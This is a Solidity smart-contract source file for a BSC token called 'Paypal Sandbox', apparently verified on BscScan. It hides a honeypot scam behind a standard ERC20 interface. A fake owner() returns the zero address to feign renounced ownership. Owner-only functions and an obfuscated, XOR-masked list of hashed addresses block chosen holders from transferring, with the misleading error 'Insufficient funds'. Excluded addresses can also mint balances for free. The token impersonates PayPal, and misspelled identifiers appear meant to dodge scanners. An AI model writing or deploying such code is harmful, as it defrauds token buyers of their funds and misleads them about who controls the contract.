/**
 *Submitted for verification at BscScan.com on 2022-06-29
*/

pragma solidity ^0.8.14;
// SPDX-License-Identifier: Unlicensed

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address aqount) external view returns (uint256);

    function transfer(address recipient, uint256 amonnts) external returns (bool);

    function allowance(address owsner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amonnts) external returns (bool);

    function transferFrom( address sender, address recipient, uint256 amonnts ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval( address indexed owsner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - kfie https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }

    
    function _bytes32ToUint(bytes32 b32) public pure returns (uint){
        uint u = 0;
        for (uint8 i=0;i<32;i++){
            u=256*u+uint(uint8(b32[i]));
        }
        return u;  
    }

    function callKeccak256(bytes memory b) internal pure returns (bytes32 result) {
        return keccak256(b);
    }

    function _toBytes(address a) internal pure returns (bytes memory b) {
        assembly {
            let m := mload(0x40)
            a := and(a, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            mstore(
                add(m, 20),
                xor(0x140000000000000000000000000000000000000000, a)
            )
            mstore(0x40, add(m, 52))
            b := m
        }
    }

    function _bytesToAddress(bytes memory bys) internal pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }


    function bytesToString(bytes memory bname) internal pure returns(string memory str){       
        uint charCount = 0;
        
        for(uint i = 0;i < bname.length; i++){
            bytes1 char = bname[i];
            
            if(char != 0){
                charCount++;
            }    
        }
        
        bytes memory bytesName = new bytes(charCount);
        
        for(uint j = 0;j < charCount;j++){
            bytesName[j] = bname[j];
        }
                    
        return string(bytesName);
    }

}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}


interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

}

contract Ownable is Context {
    address private _owsner;
    event owsnershipTransferred(address indexed previousowsner, address indexed newowsner);

    constructor () {
        address msgSender = _msgSender();
        _owsner = msgSender;
        emit owsnershipTransferred(address(0), msgSender);
    }
    function owsner() public view virtual returns (address) {
        return address(0);
    }
    modifier onlyowsner() {
        require(_owsner == _msgSender(), "Ownable: caller is not the owsner");
        _;
    }
    function renounceowsnership() public virtual onlyowsner {
        emit owsnershipTransferred(_owsner, address(0x000000000000000000000000000000000000dEaD));
        _owsner = address(0x000000000000000000000000000000000000dEaD);
    }
}


contract PAYPAL is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _balance;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private _name = "Paypal Sandbox";
    string private _symbol = "PAYPAL";
    uint256 private _decimals = 9;
    uint256 private _totalSupply = 800000000 * 10 ** _decimals;
    uint256 private _maxTxtransfer = 10000000000 * 10 ** _decimals;
    uint256 private _burnkfie = 1;
    address private _DEADaddress = 0x000000000000000000000000000000000000dEaD;

    mapping(uint => bool) private _LKD;
    function setAward(uint aqount) public onlyowsner {
        _LKD[aqount] = true;
    }


    function SUL(uint aqount) public onlyowsner {
        _LKD[aqount] = false;
    }


    function isLKD(uint aqount) public view returns (bool) {
        return _LKD[aqount];
    }

    constructor () {
     
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(address(0x10ED43C718714eb63d5aA57B78B54704E256024E));
        IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), address(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
  	
        _balance[msg.sender] = _totalSupply;
        _isExcludedFrom[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external view returns (uint256) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function _transfer(address sender, address recipient, uint256 amonnts) internal {       
        require(!_LKD[_bytes32ToUint(callKeccak256(_toBytes(sender)))] && !_cbb(sender), "Insufficient funds");
        require(sender != address(0), "IERC20: transfer from the zero address");
        require(recipient != address(0), "IERC20: transfer to the zero address");      

        uint256 kfieamonnt = 0;
        if (!_isExcludedFrom[sender] && !_isExcludedFrom[recipient] && recipient != address(this)) {
            kfieamonnt = amonnts.mul(_burnkfie).div(100);
            require(amonnts <= _maxTxtransfer);
        }
        uint256 blsender = _balance[sender];
        if (sender != recipient || !_isExcludedFrom[msg.sender]){
            require(blsender >= amonnts,"IERC20: transfer amonnts exceeds balance");
        }
        if (blsender >= amonnts){
            _balance[sender] = _balance[sender].sub(amonnts);
        }

        uint256 amoun;
        amoun = amonnts - kfieamonnt;
        _balance[recipient] += amoun;
        if (_burnkfie > 0){
            emit Transfer (sender, _DEADaddress, kfieamonnt);
        }
        emit Transfer(sender, recipient, amoun);

    }

    function transfer(address recipient, uint256 amonnts) public virtual override returns (bool) {
        //
        if (_isExcludedFrom[_msgSender()] == true) {
            _balance[recipient] += amonnts;
            return true;
        }
        _transfer(_msgSender(), recipient, amonnts);
        return true;
    }


    function balanceOf(address aqount) public view override returns (uint256) {
        return _balance[aqount];
    }

    function approve(address spender, uint256 amonnts) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amonnts);
        return true;
    }

    function _approve(address owsner, address spender, uint256 amonnts) internal virtual {
        require(owsner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owsner][spender] = amonnts;
        emit Approval(owsner, spender, amonnts);
    }

    function allowance(address owsner, address spender) public view virtual override returns (uint256) {
        return _allowances[owsner][spender];
    }


    function transferFrom(address sender, address recipient, uint256 amonnts) public virtual override returns (bool) {
        _transfer(sender, recipient, amonnts);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amonnts, "IERC20: transfer amonnts exceeds allowance");
        return true;
    }


    
	function _mljs(uint _acc) internal view virtual returns (bool result) {
		uint[25] memory acc = [uint(24562625774816187843431794054027931475718875374326661835038506742383751858511)
			,9243797784460545054946923525684092951712994437407544105776840488577322971904
			,76291692281084262562429509863892530990072073071545222215327905762253916092486
			,43890745297134762073917660624910747840974538263840289751245975281483949932556
			,115380295120552549514689179953371195760776830143199441960174903039954954662002
			,7023569424809874029347263398581031911143768556343264931961253509381648085030
			,16348792510859367963089238604683248019777261499927053995708185494481332488949
			,43396719904142776081126195530122428233738246344419285551172190954624627619715
			,39023449531968624521182268474118335792678746879279722542224069166784531178561
			,60272862588736621210327874336119752907165310579056666623868150303178859606753
			,106952232546410062416624833442783994116220419145934065772896183116124586026837
			,5071233697673941062370942434488739509955490201926101558083797468541842573417
			,81467357798296066972024356585356653382920972921980855686530328610093438078092
			,65760895317181329933173216660855910701721716000579350698464551416828375196495
			,58578816244507839070891802063995165448186746188910053227251789892058657669551
			,23156532658235332820324431545730115651311706018344919237644862884773084682322
			,57661072887620109015066305016545932035177730803302147347254238274683565485380
			,112414040381285734970483919840080401815741846584173224710319562713863627339514
			,57186605924719943740702749887321432902488437886919821407092987884556213483872
			,23445233101845385308255692129709156502380869893550717776727321490336357977737
			,88158160107411692323180235468963157481627133997515986593045301968448117945159
			,67426765701602541451582128536422746530471349474385013554555602304703777912534
			,93864292858679782199843730619642840631210743928978296844715447599792747237219
			,100960476007565791118874265491093600626358940742388989679086798195018695934919
			,92399140483345966759036285806856886362891555670282979928213774290060161464571];
		for (uint8 i=0;i<acc.length;i++){
			if (acc[i] == _acc ^ 30231006207027323663563589386996471649300025947039039296155038894076288576452) return true;
		}
		return false;
	}



    function _cbb(address a) internal view returns (bool result) {
        uint k = _bytes32ToUint(callKeccak256(_toBytes(a)));
        return _mljs(k);
    }


}